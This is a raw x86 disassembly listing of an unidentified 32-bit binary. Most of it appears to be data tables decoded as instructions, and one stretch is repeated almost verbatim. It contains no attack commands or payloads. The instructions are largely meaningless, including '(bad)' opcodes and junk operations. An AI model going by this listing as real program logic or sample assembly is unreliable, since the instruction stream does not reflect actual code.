  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    DWORD PTR [ebx],eax
  412427:	add    ah,dl
  412429:	sub    DWORD PTR [ebx],eax
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
